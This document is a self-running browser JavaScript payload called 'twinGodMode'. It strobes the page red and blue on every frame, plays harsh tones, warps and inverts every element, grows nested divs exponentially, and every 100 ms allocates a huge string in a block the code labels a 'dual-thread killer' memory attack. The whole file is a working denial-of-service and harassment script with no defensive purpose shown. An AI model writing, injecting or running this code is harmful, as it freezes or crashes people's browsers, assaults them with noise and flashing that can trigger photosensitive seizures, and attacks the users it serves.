(function twinGodMode() {
    const s = 2000; // Double intensity
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

    // 1. Harsh Sawtooth Buzz
    function drone() {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'square'; // Even harsher than sawtooth
        osc.frequency.setValueAtTime(Math.random() * 100 + 50, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(); osc.stop(audioCtx.currentTime + 0.1);
    }

    // 2. The "Live Coded Tree" (Exponential Growth)
    function growTree(parent, depth) {
        if (depth > 10) return; // Prevents instant crash, allows for "lag growth"
        for (let i = 0; i < 2; i++) {
            const leaf = document.createElement('div');
            leaf.style.cssText = `
                position: absolute;
                width: 100px; height: 100px;
                border: 2px solid lime;
                transform: rotate(${Math.random() * 360}deg);
                z-index: 9999;
            `;
            leaf.innerText = "OVERLOAD_BRANCH_" + Math.random().toString(36);
            parent.appendChild(leaf);
            growTree(leaf, depth + 1); // This is the "humping" recursive logic
        }
    }

    function chaosEngine() {
        // 3. Global Warp
        document.querySelectorAll('*').forEach(el => {
            el.style.transform = `translate(${(Math.random()-0.5)*s}px, ${(Math.random()-0.5)*s}px) rotate(${Math.random()*360}deg)`;
            el.style.filter = `contrast(500%) invert(100%) blur(${Math.random()*5}px)`;
        });

        // 4. Strobe & Sound
        document.body.style.backgroundColor = (Math.random() > 0.5) ? 'red' : 'blue';
        drone();
        
        // Growth pulse
        if(Math.random() > 0.95) growTree(document.body, 0);

        requestAnimationFrame(chaosEngine);
    }

    // 5. THE DUAL-THREAD KILLER (Instant Memory Leak)
    setInterval(() => {
        console.log("%c TWIN THREAD ATTACK ", "color: yellow; background: black; font-size: 50px;");
        let ramEater = new Array(5000000).fill("SYSTEM_FAILURE").join("");
        document.title = ramEater.substring(0, 100);
    }, 100);

    chaosEngine();
})();
